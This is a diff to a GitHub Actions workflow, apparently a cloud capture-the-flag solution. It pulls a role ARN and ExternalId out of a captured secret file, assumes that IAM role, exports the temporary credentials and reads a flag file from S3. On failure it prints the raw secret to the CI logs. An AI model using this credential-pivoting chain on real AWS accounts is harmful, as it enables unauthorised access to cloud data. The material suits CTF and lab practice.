@@ -64,17 +64,66 @@ jobs:
           aws sts get-caller-identity --output json
           aws s3 cp s3://atr3404-63428fb6/flag.txt - --region us-west-2
 
-      - name: Or assume next role (if provided)
+      - name: Assume next role (robust)
         if: steps.kind.outputs.value == 'role'
         run: |
-          ROLE=$(jq -r .RoleArn secret.json)
-          EXT=$(jq -r '.ExternalId // empty' secret.json)
-          [ -n "$EXT" ] && EXTARG=(--external-id "$EXT") || EXTARG=()
+          set -euo pipefail
+
+          # 1) Normalize the secret: try base64 decode; then try JSON->fromjson; lowercase keys
+          normalize() {
+            # Read file; if base64, decode; else pass through
+            if base64 -d < secret.json >/tmp/decoded 2>/dev/null; then
+              cat /tmp/decoded
+            else
+              cat secret.json
+            fi
+          }
+
+          # Try to coerce into JSON; if it’s a JSON string, fromjson; else wrap as {"raw": "..."}
+          normalized_json=$(
+            normalize | jq -c 'try (fromjson) catch {"raw": .}'
+          )
+          printf '%s\n' "$normalized_json" > secret.norm.json
+
+          # Lowercase keys to simplify extraction
+          printf '%s\n' "$normalized_json" \
+          | jq -c 'walk(if type=="object" then with_entries(.key |= ascii_downcase) else . end)' \
+          > secret.lower.json
+
+          # 2) Try to extract RoleArn and ExternalId from structured JSON
+          ROLE=$(jq -r '(.rolearn // .role_arn // .arn // empty)' secret.lower.json)
+          EXT=$(jq -r '(.externalid // .external_id // empty)' secret.lower.json)
+
+          # 3) Fallbacks: grep an ARN out of raw content if fields weren’t present
+          if [ -z "$ROLE" ] || [ "$ROLE" = "null" ]; then
+            ROLE=$(cat secret.json \
+              | (base64 -d 2>/dev/null || cat) \
+              | grep -Eo 'arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9+=,.@_-]+' \
+              | head -n1 || true)
+          fi
+
+          # Sanity logs (safe-ish for a CTF)
+          echo "Detected ROLE: ${ROLE:-<none>}"
+          if [ -n "${EXT:-}" ]; then echo "Detected ExternalId: <present>"; fi
+
+          if [ -z "${ROLE:-}" ]; then
+            echo "::error::Could not extract a role ARN from the secret."
+            echo "Raw preview (first 200 bytes):"
+            head -c 200 secret.json || true; echo
+            exit 1
+          fi
+
+          # 4) Assume role (include ExternalId only if present)
+          EXTARG=()
+          if [ -n "${EXT:-}" ] && [ "${EXT}" != "null" ]; then
+            EXTARG=(--external-id "$EXT")
+          fi
 
           aws sts assume-role \
             --role-arn "$ROLE" \
             --role-session-name ctf-hexnova-priv \
             "${EXTARG[@]}" \
+            --region us-west-2 \
             --output json > assume.json
 
           export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' assume.json)
@@ -82,5 +131,7 @@ jobs:
           export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' assume.json)
 
           aws sts get-caller-identity --output json
+
+          # 5) Grab the flag
           aws s3 cp s3://atr3404-63428fb6/flag.txt - --region us-west-2
 
